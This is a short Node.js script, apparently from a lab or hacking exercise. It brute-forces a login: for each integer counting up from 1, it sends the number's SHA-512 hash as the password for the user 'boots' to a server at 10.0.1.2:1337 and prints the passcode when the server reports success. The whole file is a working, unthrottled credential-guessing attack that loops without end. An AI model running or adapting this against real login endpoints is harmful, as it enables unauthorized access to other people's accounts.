var crypto = require('crypto');
var http = require('http');
var querystring = require('querystring');

var input;
var output;
// use sha512
// the input is some random between 0-99

function nextHack(i) {
  var sha512 = crypto.createHash('sha512');

    input = i.toString();
    //create the hash

    //add input
    sha512.update(input);

    //return degist
    output = sha512.digest('hex');
    // console.log(outPut);
    jonServer(output, i);
}

function jonServer(output, i) {

    var postData = querystring.stringify({
      'name' : 'boots',
      'video' : 'https://www.youtube.com/watch?v=VTbbYLvhDSM',
      'password' : output
    });

    var options = {
      hostname : '10.0.1.2',
      port : 1337,
      path : '/player',
      method : 'POST',
      headers : {
        'Content-Type' : 'application/x-www-form-urlecoded',
        'Content-Length' : postData.length
      }
    };

    var req = http.request(options, function(res) {
      // console.log('STATUS: ' + res.statusCode);
      // console.log('HEADERS: ' + JSON.stringify(res.headers));
      res.setEncoding('utf8');
      var response = '';

      // console.log('Data:',postData);
      res.on('data', function (chunk) {
        response+=chunk;
        // console.log('BODY: ' + chunk);
      });

      res.on('end', function() {
        // console.log('No more data in response.');
        // console.log(JSON.parse(response));
        var successTest = JSON.parse(response);
        // console.log('boolean', successTest.success);
        if(successTest.success === true) {
          console.log('passcode:', input);
        }

        nextHack(i+1);
      });
    });

    req.on('error', function(e) {
      console.log('problem with request: ' + e.message);
      nextHack(i+1);
    });

    // write data to request body
    req.write(postData);
    req.end();

    // console.log(i);
}

nextHack(1);


